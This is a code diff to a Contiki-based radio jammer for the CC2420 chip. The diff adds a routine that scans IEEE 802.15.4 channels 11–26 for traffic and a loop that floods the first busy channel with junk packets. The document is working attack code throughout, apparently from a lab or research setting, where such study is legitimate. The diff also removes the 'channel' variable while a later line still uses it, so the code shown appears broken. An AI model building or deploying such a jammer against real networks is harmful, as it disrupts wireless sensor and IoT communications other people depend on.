@@ -16,6 +16,7 @@
 #include "net/nullnet/nullnet.h"
 #include "net/netstack.h"
 #include <string.h>
+#include <stdbool.h>
 #include "sys/log.h"
 #include "cc2420.h"
 #include <stdlib.h>
@@ -27,6 +28,9 @@
 #define CLOCK_MS CLOCK_SECOND/1000
 #define SEND_INTERVAL (2 * CLOCK_MS) //2 ms
 #define JAMMER_PACKET_LEN 120
+
+
+static int current_channel = 11;
 
 typedef struct{
      char data[JAMMER_PACKET_LEN];
@@ -46,12 +50,35 @@ int abs(a){
     }
 }
 
+
+bool check_channel_activity(){
+    int channel_activity = 0;
+    for (int i = 0; i < 25000; i++){
+        NETSTACK_RADIO.on();
+        channel_activity += NETSTACK_RADIO.channel_clear();     //returns 0 if channel is busy and 1 if its clear
+        NETSTACK_RADIO.off();
+    }
+    printf("channel activity result: %d \n", channel_activity);
+
+    if(channel_activity != 25000){
+        printf("Activity found on channel %d! \n", current_channel);
+        return true; 
+    }
+    else {
+        printf("No activity found on channel %d. \n", current_channel);
+        return false;
+    }
+}
+
+
+
+
+
 PROCESS_THREAD(jammer, ev, data)
 {   
     PROCESS_BEGIN();
     printf("Starting jamming attack\n");
 
-    static int channel = 17;
     NETSTACK_RADIO.on();
     //NETSTACK_RADIO.set_value(RADIO_PARAM_CCA_THRESHOLD, 0); //turning CCA off (https://sourceforge.net/p/contiki/mailman/message/34745886/)
     
@@ -63,6 +90,8 @@ PROCESS_THREAD(jammer, ev, data)
     {
         printf("failed channel set");
     }
+    NETSTACK_RADIO.off();
+
     cc2420_set_channel(channel);
     
     jpacket_t jpacket;
@@ -83,6 +112,24 @@ PROCESS_THREAD(jammer, ev, data)
 
     //send a packet at random times between 0-2 seconds
     while(1) {
+
+        // Check if current_channel is active
+        // If not active, we go to next channel and try again
+        if (!check_channel_activity())
+        {   
+            // Cycle to next current_channel
+            // current_channel = (current_channel >= 26) ? 11 : current_channel++;
+            if (current_channel >= 26) {
+                current_channel = 11;
+            } else {
+                current_channel++;
+            }
+            cc2420_set_channel(current_channel);
+            // Start loop again
+            continue;
+        }
+
+
         PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&et));
         // cc2420_driver.send((void*)&jpacket, JAMMER_PACKET_LEN);
         
@@ -93,7 +140,9 @@ PROCESS_THREAD(jammer, ev, data)
                 
         watchdog_stop();
         while(random_interval <= send_time){
+            NETSTACK_RADIO.on();
             cc2420_driver.send((void*)&jpacket, JAMMER_PACKET_LEN);
+            NETSTACK_RADIO.off();
             //NETSTACK_RADIO.send((void*)&jpacket, JAMMER_PACKET_LEN);
             random_interval++;
         }
